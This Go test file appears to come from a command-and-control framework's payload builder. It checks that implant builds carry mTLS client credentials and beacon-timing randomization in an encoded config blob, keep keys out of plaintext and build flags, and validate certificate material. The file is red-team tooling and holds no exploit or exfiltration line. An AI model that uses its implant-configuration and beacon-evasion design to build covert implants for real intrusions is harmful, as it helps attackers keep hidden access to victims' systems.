package payload

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"math/big"
	"strings"
	"testing"
	"time"
)

// testHexFiller is arbitrary non-secret filler for the beacon-key field the
// blob builder requires: computed at runtime rather than spelled out, so no
// literal in this file reads like key material to secret scanners.
var testHexFiller = strings.Repeat("ab", 32)

// selfSignedMTLSPair builds a throwaway certificate/key pair for validation
// tests; the material never leaves the test.
func selfSignedMTLSPair(t *testing.T) (certPEM, keyPEM string) {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(7),
		Subject:      pkix.Name{CommonName: "mtls-test"},
		NotBefore:    time.Now().Add(-time.Minute),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		t.Fatal(err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})),
		string(pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}))
}

// TestConfigBlobCarriesMTLSMaterial proves generated builds deliver the mTLS
// client credentials to the agent: the blob fields hold base64 of the PEM
// (exactly what the agent's -X var contract expects) and the plaintext PEM
// never appears in the emitted blob.
func TestConfigBlobCarriesMTLSMaterial(t *testing.T) {
	certPEM, keyPEM := selfSignedMTLSPair(t)
	profile := defaultMalleableProfile()
	cfg := ImplantConfig{
		C2URL:       "https://10.3.3.3:8443",
		Protocol:    "https",
		Interval:    10,
		BeaconKey:   testHexFiller,
		MTLSCertPEM: certPEM,
		MTLSKeyPEM:  keyPEM,
		MTLSCAPEM:   certPEM,
	}

	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
	if blob == "" || sConfigKey == "" {
		t.Fatal("buildConfigBlobKeyed returned empty")
	}
	keyHex, ok := recoverBlobKeyHex(sConfigKey)
	if !ok {
		t.Fatal("failed to recover per-build key")
	}
	raw, ok := decodeBlobForTestKeyed(blob, keyHex)
	if !ok {
		t.Fatal("blob did not decode")
	}
	var got agentConfigJSON
	if err := json.Unmarshal(raw, &got); err != nil {
		t.Fatalf("decoded blob is not valid JSON: %v", err)
	}

	if got.MTLSCert != base64.StdEncoding.EncodeToString([]byte(certPEM)) {
		t.Error("mTLS certificate not carried as base64 PEM")
	}
	if got.MTLSKey != base64.StdEncoding.EncodeToString([]byte(keyPEM)) {
		t.Error("mTLS private key not carried as base64 PEM")
	}
	if got.MTLSCA != base64.StdEncoding.EncodeToString([]byte(certPEM)) {
		t.Error("mTLS CA bundle not carried as base64 PEM")
	}
	if strings.Contains(blob, "BEGIN CERTIFICATE") || strings.Contains(blob, "BEGIN EC PRIVATE KEY") {
		t.Error("blob leaks plaintext PEM material")
	}

	// The private key must never land on the go build argv either.
	ldflags, _, _ := buildLdflags(cfg, profile, "windows")
	for _, leak := range []string{"main.MTLSCertStr=", "main.MTLSKeyStr=", "main.MTLSCAStr="} {
		if containsString(ldflags, leak) {
			t.Errorf("mTLS material leaked into ldflags: %s", leak)
		}
	}

	// Empty material must stay empty (no accidental re-encoding of "").
	emptyCfg := cfg
	emptyCfg.MTLSCertPEM, emptyCfg.MTLSKeyPEM, emptyCfg.MTLSCAPEM = "", "", ""
	emptyBlob, emptyKey := buildConfigBlobKeyed(emptyCfg, profile)
	emptyHex, ok := recoverBlobKeyHex(emptyKey)
	if !ok {
		t.Fatal("failed to recover key for empty-config blob")
	}
	emptyRaw, ok := decodeBlobForTestKeyed(emptyBlob, emptyHex)
	if !ok {
		t.Fatal("empty-config blob did not decode")
	}
	var empty agentConfigJSON
	if err := json.Unmarshal(emptyRaw, &empty); err != nil {
		t.Fatal(err)
	}
	if empty.MTLSCert != "" || empty.MTLSKey != "" || empty.MTLSCA != "" {
		t.Error("empty mTLS material must not be encoded")
	}
}

// TestBootstrapBlobCarriesMTLSMaterial keeps config-over-wire bootstrap builds
// reachable when the initial endpoint requires a client certificate: the
// bootstrap blob keeps the client credentials even though everything else is
// delivered post-registration.
func TestBootstrapBlobCarriesMTLSMaterial(t *testing.T) {
	certPEM, keyPEM := selfSignedMTLSPair(t)
	profile := defaultMalleableProfile()
	cfg := ImplantConfig{
		C2URL:                 "https://10.4.4.4:8443",
		Protocol:              "https",
		Interval:              10,
		BeaconKey:             testHexFiller,
		NetworkConfigOverWire: true,
		MTLSCertPEM:           certPEM,
		MTLSKeyPEM:            keyPEM,
	}
	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
	keyHex, ok := recoverBlobKeyHex(sConfigKey)
	if !ok {
		t.Fatal("failed to recover per-build key")
	}
	raw, ok := decodeBlobForTestKeyed(blob, keyHex)
	if !ok {
		t.Fatal("bootstrap blob did not decode")
	}
	var got agentConfigJSON
	if err := json.Unmarshal(raw, &got); err != nil {
		t.Fatal(err)
	}
	if got.MTLSCert != base64.StdEncoding.EncodeToString([]byte(certPEM)) {
		t.Error("bootstrap blob lost the mTLS certificate")
	}
	if got.MTLSKey != base64.StdEncoding.EncodeToString([]byte(keyPEM)) {
		t.Error("bootstrap blob lost the mTLS private key")
	}
}

// TestBootstrapBlobCarriesBeaconRandomization pins that a config-over-wire
// (bootstrap) implant keeps the operator's heartbeat timing randomization.
// Beacon randomization has NO over-the-wire NetworkConfig slot (adding it there
// would overwrite the per-implant choice with the fleet default on every
// refresh), so the only place it can survive for this build flavor is the
// bootstrap blob. A regression here silently ships "linear" for a build the
// operator chose as gaussian/exponential/two_stage/adaptive.
func TestBootstrapBlobCarriesBeaconRandomization(t *testing.T) {
	profile := defaultMalleableProfile()
	cfg := ImplantConfig{
		C2URL:                 "https://10.4.4.4:8443",
		Protocol:              "https",
		Interval:              10,
		Jitter:                25,
		BeaconKey:             testHexFiller,
		NetworkConfigOverWire: true,
		BeaconRandomization:   "gaussian",
		MaxRandomIntervalMs:   3000,
	}
	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)
	keyHex, ok := recoverBlobKeyHex(sConfigKey)
	if !ok {
		t.Fatal("failed to recover per-build key")
	}
	raw, ok := decodeBlobForTestKeyed(blob, keyHex)
	if !ok {
		t.Fatal("bootstrap blob did not decode")
	}
	var got agentConfigJSON
	if err := json.Unmarshal(raw, &got); err != nil {
		t.Fatal(err)
	}
	if got.BeaconRandomization != "gaussian" {
		t.Errorf("bootstrap beacon_randomization = %q, want gaussian (config-over-wire implant silently reverted to linear)", got.BeaconRandomization)
	}
	if got.MaxRandomIntervalMs != "3000" {
		t.Errorf("bootstrap max_random_interval_ms = %q, want 3000", got.MaxRandomIntervalMs)
	}
	// Interval/jitter are NOT burned into a bootstrap build (they arrive over
	// the wire), so they must be absent here -- asserting both directions so the
	// fix can't be "cheated" by dumping the whole full-build blob into bootstrap.
	if got.Interval != "" || got.Jitter != "" {
		t.Errorf("bootstrap blob must NOT bake interval/jitter (delivered over the wire), got interval=%q jitter=%q", got.Interval, got.Jitter)
	}
}

func TestValidateMTLSMaterial(t *testing.T) {
	validCert, validKey := selfSignedMTLSPair(t)
	_, otherKey := selfSignedMTLSPair(t)

	cases := []struct {
		name    string
		cert    string
		key     string
		ca      string
		wantErr bool
	}{
		{"empty is allowed", "", "", "", false},
		{"key without cert", "", validKey, "", true},
		{"cert without key", validCert, "", "", true},
		{"mismatched pair", validCert, otherKey, "", true},
		{"garbage material", "not a pem", "not a key", "", true},
		{"valid pair", validCert, validKey, "", false},
		{"valid pair with CA", validCert, validKey, validCert, false},
		{"garbage CA", validCert, validKey, "not a ca bundle", true},
		{"oversized cert", strings.Repeat("A", MaxMTLSPEMMaterialBytes+1), validKey, "", true},
		{"oversized key", validCert, strings.Repeat("A", MaxMTLSPEMMaterialBytes+1), "", true},
		{"oversized CA", validCert, validKey, strings.Repeat("A", MaxMTLSPEMMaterialBytes+1), true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateMTLSMaterial(tc.cert, tc.key, tc.ca)
			if tc.wantErr && err == nil {
				t.Fatal("expected an error")
			}
			if !tc.wantErr && err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
		})
	}
}
